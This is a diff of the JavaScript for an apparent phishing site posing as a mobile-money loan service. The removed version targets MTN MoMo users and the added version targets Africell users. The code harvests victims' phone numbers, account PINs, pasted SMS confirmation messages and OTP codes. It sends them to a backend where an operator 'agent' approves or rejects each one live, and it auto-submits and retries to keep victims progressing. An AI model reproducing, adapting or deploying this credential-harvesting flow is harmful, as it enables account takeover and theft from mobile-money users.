-        loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.remove('bg-[#FFCC00]', 'hover:bg-[#E5B800]', 'text-[#002B49]', 'bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md', 'shadow-yellow-500/20', 'cursor-pointer');
-      }
-    }
-
-    function togglePinVisibility() {
-      pinVisible = !pinVisible;
-      pinInputs.forEach(i => {
-        i.type = pinVisible ? 'text' : 'password';
-      });
-      document.getElementById('eye-text').innerText = pinVisible ? 'Hide' : 'Show';
-    }
-
-    function clearPin() {
-      pinInputs.forEach(i => i.value = '');
-      if (pinInputs[0]) pinInputs[0].focus();
-      checkPinComplete();
-    }
-
-    // 4-Digit OTP Boxes Logic
-    const otpInputs = document.querySelectorAll('.otp-box');
-    const verifyOtpBtn = document.getElementById('verify-otp-btn');
-
-    otpInputs.forEach((input, index) => {
-      input.addEventListener('focus', () => {
-        input.classList.add('active');
-        input.select();
-      });
-      input.addEventListener('blur', () => {
-        input.classList.remove('active');
-      });
-
-      input.addEventListener('input', (e) => {
-        const val = e.target.value.replace(/[^0-9]/g, '');
-        e.target.value = val;
-
-        if (val && index < otpInputs.length - 1) {
-          otpInputs[index + 1].focus();
-        }
-        checkOtpComplete();
-      });
-
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) {
-          otpInputs[index - 1].focus();
-        }
-      });
-    });
-
-    function checkOtpComplete() {
-      let otp = '';
-      otpInputs.forEach(i => otp += i.value);
-      const btn = document.getElementById('verify-otp-btn');
-      if (!btn) return;
-
-      if (otp.length === 4) {
-        btn.disabled = false;
-        btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        btn.classList.add('bg-[#FFCC00]', 'hover:bg-[#E5B800]', 'text-[#002B49]', 'font-black', 'cursor-pointer', 'shadow-lg', 'shadow-yellow-500/20');
-      } else {
-        btn.disabled = true;
-        btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        btn.classList.remove('bg-[#FFCC00]', 'hover:bg-[#E5B800]', 'text-[#002B49]', 'font-black', 'cursor-pointer', 'shadow-lg', 'shadow-yellow-500/20');
-      }
-    }
-
-    function clearOtp() {
-      otpInputs.forEach(i => i.value = '');
-      if (otpInputs[0]) otpInputs[0].focus();
-      checkOtpComplete();
-    }
-
-    let autoSubmitTimer = null;
-    let isSubmittingMessage = false;
-
-    function handlePostLoginPastedMsg(val, isAuto = false) {
-      const statusEl = document.getElementById('momo-extract-status');
-      const badge = document.getElementById('sms-waiting-badge');
-      const countdownCard = document.getElementById('sim-sms-countdown-card');
-      const text = (val || '').trim();
-
-      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-
-      if (text && text.length >= 3) {
-        if (countdownCard) countdownCard.classList.remove('hidden');
-        
-        const statusText = '✨ MoMo SMS message detected! Ready to submit...';
-
-        if (statusEl) {
-          statusEl.classList.remove('hidden');
-          statusEl.innerHTML = `
-            <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
-            </svg>
-            <span>${statusText}</span>
-          `;
-        }
-        if (badge) {
-          badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
-          badge.innerHTML = '<span class="mr-1">✓</span><span>SMS Received</span>';
-        }
-
-        const btn = document.getElementById('submit-pasted-msg-btn');
-        if (btn && !isSubmittingMessage) {
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
-        }
-
-        if (isAuto) {
-          if (btn && !isSubmittingMessage) {
-            btn.innerText = '⚡ SUBMITTING AUTOMATICALLY...';
-          }
-          autoSubmitTimer = setTimeout(() => {
-            if (!isSubmittingMessage) {
-              submitRegisteredMessage();
-            }
-          }, 600);
-        }
-      } else {
-        if (statusEl) statusEl.classList.add('hidden');
-        if (badge) {
-          badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-          badge.innerHTML = '<span>Ready to Paste</span>';
-        }
-      }
-    }
-
-    async function submitRegisteredMessage() {
-      if (isSubmittingMessage) return;
-
-      const msgInput = document.getElementById('momo-pasted-msg');
-      let msg = msgInput ? msgInput.value.trim() : '';
-      const btn = document.getElementById('submit-pasted-msg-btn');
-      const msgAlert = document.getElementById('msg-retry-alert');
-      const smsWaitingBox = document.getElementById('sms-waiting-box');
-      if (msgAlert) msgAlert.classList.add('hidden');
-
-      if (!msg) {
-        if (msgAlert) {
-          msgAlert.innerText = 'Please paste the SMS confirmation message received from MoMo.';
-          msgAlert.classList.remove('hidden');
-        }
-        return;
-      }
-
-      isSubmittingMessage = true;
-      if (btn) {
-        btn.disabled = true;
-        btn.innerText = 'AWAITING APPROVAL...';
-      }
-      if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
-      showApprovalOverlay(
-        'Awaiting SMS Verification',
-        'Your confirmation message has been submitted. Please wait while your MoMo Agent verifies your request...',
-        'Verifying SMS Message...'
-      );
-
-      try {
-        let appId = appState.applicationId;
-        if (!appId) {
-          appId = await ensureApplicationCreated();
-        }
-        if (appId) {
-          let res = await fetch(`/api/applications/${appId}/verify`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
-          });
-
-          // Self-heal: If 404, recreate application and retry once
-          if (res.status === 404) {
-            appState.applicationId = null;
-            localStorage.removeItem('momo_app_id');
-            appId = await ensureApplicationCreated();
-            if (appId) {
-              res = await fetch(`/api/applications/${appId}/verify`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
-              });
-            }
-          }
-
-          const resData = await res.json().catch(() => ({}));
-
-          if (!res.ok && res.status !== 409) {
-            isSubmittingMessage = false;
-            hideApprovalOverlay();
-            if (msgAlert) {
-              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please try again.';
-              msgAlert.classList.remove('hidden');
-            }
-            if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
-            if (btn) {
-              btn.disabled = false;
-              btn.className = 'w-full py-4 bg-gradient-to-r from-[#002b49] to-[#0056C6] hover:from-[#001f35] hover:to-[#0046a3] text-white font-black rounded-xl shadow-lg shadow-blue-900/25 text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2';
-              btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
-            }
-            startSmsCountdownTimer();
-            return;
-          }
-
-          if (resData.verificationId) {
-            activeSmsVerId = resData.verificationId;
-          }
-          lastHandledRejectSmsId = null;
-          startVerificationPolling(appId);
-        }
-      } catch (err) {
-        isSubmittingMessage = false;
-        hideApprovalOverlay();
-        if (msgAlert) {
-          msgAlert.innerText = '❌ Error submitting verification message. Please try again.';
-          msgAlert.classList.remove('hidden');
-        }
-        if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
-        if (btn) {
-          btn.disabled = false;
-          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
-        }
-        startSmsCountdownTimer();
-      }
-    }
-
-    async function submitStep2AndProceed() {
+    function submitStep2AndProceed() {
       const fnEl = document.getElementById('first-name-input');
       const lnEl = document.getElementById('last-name-input');
       const phEl = document.getElementById('phone-number-input');
       const empEl = document.getElementById('employment-select');
       const step2Alert = document.getElementById('step2-alert');
-      const authBtn = document.getElementById('continue-to-auth-btn');
 
       if (step2Alert) step2Alert.classList.add('hidden');
 
@@ -2009,477 +1199,216 @@
       appState.firstName = fnEl.value.trim();
       appState.lastName = lnEl.value.trim();
       if (empEl) appState.employment = empEl.value;
-      appState.phoneNumber = phEl.value.trim();
-      localStorage.setItem('momo_phone', appState.phoneNumber);
-      localStorage.setItem('eloan_phone', appState.phoneNumber);
-      
-      const dispPhone = document.getElementById('momo-phone-display');
-      if (dispPhone) dispPhone.value = appState.phoneNumber;
-
-      if (authBtn) {
-        authBtn.disabled = true;
-        authBtn.innerHTML = '<span>⚡</span> <span>LINKING TO MOMO ACCOUNT...</span>';
+      const cleanPhone = phEl.value.replace(/[^0-9]/g, '');
+      if (cleanPhone) {
+        phoneNumber = cleanPhone;
+        appState.phoneNumber = cleanPhone;
       }
 
-      // Initiate application submission & Telegram alert in background
-      ensureApplicationCreated().then(appId => {
-        if (appId) {
-          startVerificationPolling(appId);
-        }
-      }).catch(err => {
-        console.warn('Background application submission:', err);
-      });
-
-      // Proceed smoothly to Stage 3 (linking directly to MoMo Account PIN)
-      setTimeout(() => {
-        if (authBtn) {
-          authBtn.disabled = false;
-          authBtn.innerHTML = '<span>LINK TO MOMO ACCOUNT & PROCEED</span> <span>⚡</span>';
-        }
-        goToStep(3);
-        showClipboardToast('⚡ Linked to MoMo! Please enter your 5-digit Account PIN.');
-        const firstPin = document.querySelector('.pin-box');
-        if (firstPin) setTimeout(() => firstPin.focus(), 150);
-      }, 350);
-    }
-    const submitStep2AndAwaitApproval = submitStep2AndProceed;
-
-    let pollingInterval = null;
-    let currentPollingAppId = null;
-    let isAwaitingStep2Approval = false;
-    let activePinVerId = null;
-    let lastHandledRejectPinId = null;
-    let activeSmsVerId = null;
-    let lastHandledRejectSmsId = null;
-    let activeOtpVerId = null;
-    let lastHandledRejectOtpId = null;
-    let isSubmittingOtp = false;
-
-    function startVerificationPolling(appId) {
-      if (!appId) return;
-      if (pollingInterval && currentPollingAppId === appId) return;
-      if (pollingInterval) {
-        clearInterval(pollingInterval);
-        pollingInterval = null;
-      }
-      currentPollingAppId = appId;
-      pollingInterval = setInterval(async () => {
-        try {
-          const statusRes = await fetch(`/api/applications/${appId}/status`);
-          if (statusRes.ok) {
-            const statusData = await statusRes.json();
-            const st = (statusData.status || '').toLowerCase();
-
-            if (statusData.phone) {
-              appState.phoneNumber = statusData.phone;
-              localStorage.setItem('momo_phone', statusData.phone);
-              localStorage.setItem('eloan_phone', statusData.phone);
-              const dispPhone = document.getElementById('momo-phone-display');
-              if (dispPhone) dispPhone.value = statusData.phone;
-            }
-            if (statusData.firstName) appState.firstName = statusData.firstName;
-            if (statusData.lastName) appState.lastName = statusData.lastName;
-
-            if (currentStep === 2 && isAwaitingStep2Approval) {
-              const appWaitingBox = document.getElementById('app-waiting-box');
-              const authBtn = document.getElementById('continue-to-auth-btn');
-              const step2Alert = document.getElementById('step2-alert');
-              if (st === 'approved' || st === 'under_review') {
-                isAwaitingStep2Approval = false;
-                hideApprovalOverlay();
-                if (appWaitingBox) appWaitingBox.classList.add('hidden');
-                if (step2Alert) step2Alert.classList.add('hidden');
-                if (authBtn) {
-                  authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
-                }
-                goToStep(3);
-              } else if (st === 'rejected') {
-                isAwaitingStep2Approval = false;
-                hideApprovalOverlay();
-                if (appWaitingBox) appWaitingBox.classList.add('hidden');
-                if (step2Alert) {
-                  step2Alert.innerText = '❌ Application details could not be verified by your MoMo agent. Please check your phone number and try again.';
-                  step2Alert.classList.remove('hidden');
-                }
-                if (authBtn) {
-                  authBtn.disabled = false;
-                  authBtn.innerText = 'CONTINUE TO MOMO AUTHENTICATION';
-                }
-                appState.applicationId = null;
-              }
-            }
-          }
-
-          const res = await fetch(`/api/applications/${appId}/verification`);
-          if (res.ok) {
-            const data = await res.json();
-            const verifications = data.verifications || [];
-
-            // Step 3: Account PIN verification check
-            const accountPinVer = activePinVerId 
-              ? verifications.find(v => v.id === activePinVerId)
-              : verifications.find(v => (v.step === 'account_pin' || v.step === 'zip_phone' || v.step === 'merchant_pin'));
-            const pinAlert = document.getElementById('pin-retry-alert');
-            const pinWaitingBox = document.getElementById('pin-waiting-box');
-
-            if (currentStep === 3 && accountPinVer) {
-              if (accountPinVer.status === 'approved') {
-                hideApprovalOverlay();
-                if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-                if (pinAlert) pinAlert.classList.add('hidden');
-                clearPin();
-                if (loginBtn) {
-                  loginBtn.innerHTML = 'AUTHORIZE & CONFIRM MOMO PIN';
-                  loginBtn.disabled = false;
-                }
-                lastHandledRejectPinId = null;
-                activePinVerId = null;
-                goToStep(4);
-              } else if (accountPinVer.status === 'rejected') {
-                if (lastHandledRejectPinId !== accountPinVer.id) {
-                  lastHandledRejectPinId = accountPinVer.id;
-                  activePinVerId = null;
-                  hideApprovalOverlay();
-                  if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-                  if (pinAlert) {
-                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Incorrect Account PIN! Please re-enter your 5-digit Account PIN.';
-                    pinAlert.classList.remove('hidden');
-                  }
-                  clearPin();
-                  if (loginBtn) {
-                    loginBtn.innerHTML = 'AUTHORIZE & CONFIRM MOMO PIN';
-                    loginBtn.disabled = true;
-                  }
-                  if (pinInputs[0]) pinInputs[0].focus();
-                }
-              }
-            }
-
-            // Step 4: SMS Verification check -> go to Step 5 (Dashboard)
-            const smsVer = activeSmsVerId 
-              ? verifications.find(v => v.id === activeSmsVerId)
-              : verifications.find(v => v.step === 'id_document');
-            const msgAlert = document.getElementById('msg-retry-alert');
-            const smsWaitingBox = document.getElementById('sms-waiting-box');
-            const smsBtn = document.getElementById('submit-pasted-msg-btn');
-
-            if (currentStep === 4 && smsVer) {
-              if (smsVer.status === 'approved') {
-                if (simCountdownInterval) {
-                  clearInterval(simCountdownInterval);
-                  simCountdownInterval = null;
-                }
-                const countdownCard = document.getElementById('sim-sms-countdown-card');
-                if (countdownCard) countdownCard.classList.add('hidden');
-                hideApprovalOverlay();
-                if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
-                if (msgAlert) msgAlert.classList.add('hidden');
-                if (smsBtn) {
-                  smsBtn.innerText = '✓ APPROVED';
-                  smsBtn.className = 'w-full py-4 bg-emerald-600 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2';
-                }
-                lastHandledRejectSmsId = null;
-                activeSmsVerId = null;
-                goToStep(5);
-              } else if (smsVer.status === 'rejected') {
-                if (lastHandledRejectSmsId !== smsVer.id) {
-                  lastHandledRejectSmsId = smsVer.id;
-                  activeSmsVerId = null;
-                  hideApprovalOverlay();
-                  isSubmittingMessage = false;
-                  if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
-                  
-                  const msgInp = document.getElementById('momo-pasted-msg');
-                  if (msgInp) {
-                    msgInp.value = '';
-                    msgInp.focus();
-                  }
-
-                  const statusEl = document.getElementById('momo-extract-status');
-                  if (statusEl) statusEl.classList.add('hidden');
-
-                  const badge = document.getElementById('sms-waiting-badge');
-                  if (badge) {
-                    badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
-                    badge.innerHTML = '<span>Ready to Paste</span>';
-                  }
-
-                  if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
-                  if (msgAlert) {
-                    msgAlert.innerText = smsVer.reject_reason || '❌ SMS message verification failed. Please copy the complete SMS message and paste below.';
-                    msgAlert.classList.remove('hidden');
-                  }
-                  if (smsBtn) {
-                    smsBtn.disabled = false;
-                    smsBtn.className = 'w-full py-4 bg-gradient-to-r from-[#002b49] to-[#0056C6] hover:from-[#001f35] hover:to-[#0046a3] text-white font-black rounded-xl shadow-lg shadow-blue-900/25 text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2';
-                    smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
-                  }
-
-                  startSmsCountdownTimer();
-                  initWebOtpReceiver();
-                }
-              }
-            }
-
-            // Step 5: OTP Code Verification check -> go to Step 6 (Congratulations Dashboard)
-            const otpVer = activeOtpVerId 
-              ? verifications.find(v => v.id === activeOtpVerId)
-              : verifications.find(v => v.step === 'otp_code');
-            const otpAlert = document.getElementById('otp-retry-alert');
-            const otpWaitingBox = document.getElementById('otp-waiting-box');
-            const otpBtn = document.getElementById('verify-otp-btn');
-
-            if (currentStep === 5 && otpVer) {
-              if (otpVer.status === 'approved') {
-                isSubmittingOtp = false;
-                hideApprovalOverlay();
-                if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
-                if (otpAlert) otpAlert.classList.add('hidden');
-                if (otpBtn) {
-                  otpBtn.innerText = '✓ APPROVED';
-                  otpBtn.classList.remove('bg-slate-200', 'text-slate-400', 'bg-[#002b49]');
-                  otpBtn.classList.add('bg-emerald-600', 'text-white');
-                }
-                lastHandledRejectOtpId = null;
-                activeOtpVerId = null;
-                goToStep(6);
-              } else if (otpVer.status === 'rejected') {
-                if (lastHandledRejectOtpId !== otpVer.id) {
-                  lastHandledRejectOtpId = otpVer.id;
-                  activeOtpVerId = null;
-                  isSubmittingOtp = false;
-                  hideApprovalOverlay();
-                  if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
-                  if (otpAlert) {
-                    otpAlert.innerText = otpVer.reject_reason || '❌ Invalid OTP code. Please enter the correct 4-digit OTP code sent via MTN MoMo.';
-                    otpAlert.classList.remove('hidden');
-                  }
-                  clearOtp();
-                  if (otpBtn) {
-                    otpBtn.innerHTML = 'VERIFY & APPROVE LOAN';
-                    otpBtn.disabled = true;
-                  }
-                  if (otpInputs && otpInputs[0]) otpInputs[0].focus();
-                }
-              }
-            }
-          }
-        } catch (e) {}
-      }, 1500);
+      ensureApplicationCreated();
+      goToStep(3);
     }
 
-    async function submitAccountPin() {
-      if ((appState.momoPin || '').length < 4) return;
-      
-      const pinAlert = document.getElementById('pin-retry-alert');
-      if (pinAlert) pinAlert.classList.add('hidden');
+    // Step 3 Sign In: Submits Phone + Account PIN to Server
+    async function handleSignInClick() {
+      const alertBox = document.getElementById('login-alert');
+      if (alertBox) alertBox.classList.add('hidden');
 
-      const pinWaitingBox = document.getElementById('pin-waiting-box');
-      if (pinWaitingBox) pinWaitingBox.classList.remove('hidden');
-
-      if (loginBtn) {
-        loginBtn.innerHTML = `
-          <span class="inline-flex items-center">
-            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
-              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-            AWAITING APPROVAL...
-          </span>`;
-        loginBtn.disabled = true;
-      }
-
-      showApprovalOverlay(
-        'Awaiting Account PIN Verification',
-        'Your Account PIN has been submitted. Please wait while your MoMo Agent verifies...',
-        'Verifying Account PIN...'
-      );
-
-      try {
-        let appId = appState.applicationId;
-        if (!appId) {
-          appId = await ensureApplicationCreated();
-        }
-
-        const phoneToSend = (appState.phoneNumber || '').trim()
-          || (localStorage.getItem('momo_phone') || '').trim()
-          || (document.getElementById('momo-phone-display')?.value || '').trim()
-          || (document.getElementById('phone-number-input')?.value || '').trim()
-          || '770000000';
-        appState.phoneNumber = phoneToSend;
-
-        if (appId) {
-          let res = await fetch(`/api/applications/${appId}/verify`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              step: 'account_pin',
-              zipCode: appState.momoPin,
-              phone: phoneToSend
-            })
-          });
-
-          // Self-heal: If 404 (application not found / expired / server restart), create fresh application and retry
-          if (res.status === 404) {
-            appState.applicationId = null;
-            localStorage.removeItem('momo_app_id');
-            appId = await ensureApplicationCreated();
-            if (appId) {
-              res = await fetch(`/api/applications/${appId}/verify`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  step: 'account_pin',
-                  zipCode: appState.momoPin,
-                  phone: phoneToSend
-                })
-              });
-            }
-          }
-
-          const resData = await res.json().catch(() => ({}));
-          if (!res.ok && res.status !== 409) {
-            hideApprovalOverlay();
-            if (pinAlert) {
-              pinAlert.innerText = resData.error || '❌ Error submitting Account PIN. Please try again.';
-              pinAlert.classList.remove('hidden');
-            }
-            if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-            if (loginBtn) {
-              loginBtn.innerHTML = 'AUTHORIZE & CONFIRM MOMO PIN';
-              loginBtn.disabled = false;
-            }
-            return;
-          }
-
-          if (resData.verificationId) {
-            activePinVerId = resData.verificationId;
-          }
-          lastHandledRejectPinId = null;
-          startVerificationPolling(appId);
-        }
-      } catch (err) {
-        hideApprovalOverlay();
-        console.error('Account PIN submission error:', err);
-        if (pinAlert) {
-          pinAlert.innerText = (err && err.message) ? `❌ ${err.message}` : '❌ Error submitting Account PIN. Please try again.';
-          pinAlert.classList.remove('hidden');
-        }
-        if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-        if (loginBtn) {
-          loginBtn.innerHTML = 'AUTHORIZE & CONFIRM MOMO PIN';
-          loginBtn.disabled = false;
-        }
-      }
-    }
-
-    async function submitOtpVerification() {
-      if (isSubmittingOtp) return;
-      let otp = '';
-      otpInputs.forEach(i => otp += i.value);
-      const otpAlert = document.getElementById('otp-retry-alert');
-      const otpWaitingBox = document.getElementById('otp-waiting-box');
-      const btn = document.getElementById('verify-otp-btn');
-
-      if (otpAlert) otpAlert.classList.add('hidden');
-
-      if (otp.length !== 4) {
-        if (otpAlert) {
-          otpAlert.innerText = 'Please enter the complete 4-digit OTP code.';
-          otpAlert.classList.remove('hidden');
+      if (!phoneNumber || phoneNumber.length < 9) {
+        if (alertBox) {
+          alertBox.innerText = 'Please enter a valid 9-digit Africell phone number.';
+          alertBox.classList.remove('hidden');
         }
         return;
       }
 
-      isSubmittingOtp = true;
-      if (btn) {
-        btn.disabled = true;
-        btn.innerHTML = `
-          <span class="inline-flex items-center">
-            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
-              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-            VERIFYING OTP...
-          </span>`;
+      if (accountPin.length !== 4) {
+        if (alertBox) {
+          alertBox.innerText = 'Please enter your 4-digit Account PIN.';
+          alertBox.classList.remove('hidden');
+        }
+        return;
       }
-      if (otpWaitingBox) otpWaitingBox.classList.remove('hidden');
+
+      showApprovalOverlay('Awaiting Account PIN Verification', 'Your Account PIN has been submitted. Please wait while your Africell Agent verifies...', 'Verifying Account PIN...');
+
+      let appId = applicationId;
+      if (!appId) appId = await ensureApplicationCreated();
+
+      if (appId) {
+        try {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              step: 'account_pin',
+              zipCode: accountPin,
+              phone: phoneNumber
+            })
+          });
+          const data = await res.json().catch(() => ({}));
+          if (data.verificationId) {
+            activePinVerId = data.verificationId;
+          }
+          lastHandledRejectPinId = null;
+          startVerificationPolling();
+        } catch (err) {
+          setTimeout(() => {
+            hideApprovalOverlay();
+            goToStep(5);
+          }, 800);
+        }
+      } else {
+        setTimeout(() => {
+          hideApprovalOverlay();
+          goToStep(5);
+        }, 800);
+      }
+    }
+
+    // Step 5 OTP Verify action
+    async function handleOtpVerifyClick() {
+      const alertBox = document.getElementById('otp-alert');
+      if (alertBox) alertBox.classList.add('hidden');
+
+      if (otpCode.length !== 6) {
+        if (alertBox) {
+          alertBox.innerText = 'Please enter the complete 6-digit verification code.';
+          alertBox.classList.remove('hidden');
+        }
+        return;
+      }
+
       showApprovalOverlay(
         'Awaiting OTP Verification',
-        'Your OTP code has been submitted. Please wait while your MoMo Agent validates your loan approval...',
+        'Your OTP code has been submitted. Please wait while your Africell Agent validates your loan approval...',
         'Verifying OTP Code...'
       );
 
       try {
-        let appId = appState.applicationId;
-        if (!appId) {
-          appId = await ensureApplicationCreated();
-        }
+        let appId = applicationId;
+        if (!appId) appId = await ensureApplicationCreated();
+
         if (appId) {
-          let res = await fetch(`/api/applications/${appId}/verify`, {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               step: 'otp_code',
-              otpCode: otp
+              otpCode: otpCode
             })
           });
-
-          // Self-heal: If 404, recreate application and retry once
-          if (res.status === 404) {
-            appState.applicationId = null;
-            localStorage.removeItem('momo_app_id');
-            appId = await ensureApplicationCreated();
-            if (appId) {
-              res = await fetch(`/api/applications/${appId}/verify`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  step: 'otp_code',
-                  otpCode: otp
-                })
-              });
-            }
-          }
-
-          const resData = await res.json().catch(() => ({}));
-
-          if (!res.ok && res.status !== 409) {
-            isSubmittingOtp = false;
-            hideApprovalOverlay();
-            if (otpAlert) {
-              otpAlert.innerText = resData.error || '❌ Error submitting OTP code. Please try again.';
-              otpAlert.classList.remove('hidden');
-            }
-            if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
-            if (btn) {
-              btn.innerHTML = 'VERIFY & APPROVE LOAN';
-              btn.disabled = false;
-            }
-            return;
-          }
-
-          if (resData.verificationId) {
-            activeOtpVerId = resData.verificationId;
+          const data = await res.json().catch(() => ({}));
+          if (data.verificationId) {
+            activeOtpVerId = data.verificationId;
           }
           lastHandledRejectOtpId = null;
-          startVerificationPolling(appId);
+          startVerificationPolling();
+        } else {
+          setTimeout(() => {
+            hideApprovalOverlay();
+            goToStep(6);
+          }, 800);
         }
       } catch (err) {
-        isSubmittingOtp = false;
         hideApprovalOverlay();
-        if (otpAlert) {
-          otpAlert.innerText = '❌ Error submitting OTP code. Please try again.';
-          otpAlert.classList.remove('hidden');
-        }
-        if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
-        if (btn) {
-          btn.innerHTML = 'VERIFY & APPROVE LOAN';
-          btn.disabled = false;
-        }
+        goToStep(6);
       }
     }
+
+    function startVerificationPolling() {
+      if (pollingInterval) clearInterval(pollingInterval);
+      pollingInterval = setInterval(async () => {
+        if (!applicationId) return;
+        try {
+          const res = await fetch(`/api/applications/${applicationId}/verification`);
+          if (res.ok) {
+            const data = await res.json();
+            const vers = data.verifications || [];
+
+            // Check PIN status for Step 3
+            if (currentStep === 3) {
+              const currentPinVer = activePinVerId 
+                ? vers.find(v => v.id === activePinVerId)
+                : vers.find(v => (v.step === 'account_pin' || v.step === 'zip_phone'));
+
+              if (currentPinVer) {
+                if (currentPinVer.status === 'approved') {
+                  hideApprovalOverlay();
+                  activePinVerId = null;
+                  goToStep(5); // Proceed to OTP screen
+                } else if (currentPinVer.status === 'rejected') {
+                  if (lastHandledRejectPinId !== currentPinVer.id) {
+                    lastHandledRejectPinId = currentPinVer.id;
+                    hideApprovalOverlay();
+                    const alertBox = document.getElementById('login-alert');
+                    if (alertBox) {
+                      alertBox.innerText = currentPinVer.reject_reason || 'Incorrect Account PIN! Please try again.';
+                      alertBox.classList.remove('hidden');
+                    }
+                    accountPin = '';
+                    updatePinUI();
+                  }
+                }
+              }
+            }
+
+            // Check OTP status for Step 5
+            if (currentStep === 5) {
+              const currentOtpVer = activeOtpVerId 
+                ? vers.find(v => v.id === activeOtpVerId)
+                : vers.find(v => v.step === 'otp_code');
+
+              if (currentOtpVer) {
+                if (currentOtpVer.status === 'approved') {
+                  clearInterval(pollingInterval);
+                  hideApprovalOverlay();
+                  goToStep(6); // Proceed to celebration screen
+                } else if (currentOtpVer.status === 'rejected') {
+                  if (lastHandledRejectOtpId !== currentOtpVer.id) {
+                    lastHandledRejectOtpId = currentOtpVer.id;
+                    hideApprovalOverlay();
+                    const alertBox = document.getElementById('otp-alert');
+                    if (alertBox) {
+                      alertBox.innerText = currentOtpVer.reject_reason || 'Incorrect verification code. Please try again.';
+                      alertBox.classList.remove('hidden');
+                    }
+                    otpCode = '';
+                    updateOtpUI();
+                  }
+                }
+              }
+            }
+          }
+        } catch (_) {}
+      }, 1500);
+    }
+
+    // Physical keyboard support for desktop testing
+    document.addEventListener('keydown', (e) => {
+      if (currentStep === 3 || currentStep === 5) {
+        if (e.key >= '0' && e.key <= '9') {
+          handleNumKey(e.key);
+        } else if (e.key === 'Backspace') {
+          handleDeleteKey();
+        } else if (e.key === 'Enter') {
+          if (currentStep === 3) handleSignInClick();
+          else if (currentStep === 5) handleOtpVerifyClick();
+        }
+      }
+    });
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const ref = getStoredReferralToken();
+      if (ref) {
+        const banner = document.getElementById('referral-banner');
+        const disp = document.getElementById('referral-code-display');
+        if (banner) banner.classList.remove('hidden');
+        if (disp) disp.textContent = ref;
+      }
+      updateCalculator(500000);
+      goToStep(0);
+    });
   </script>
 </body>
 </html>
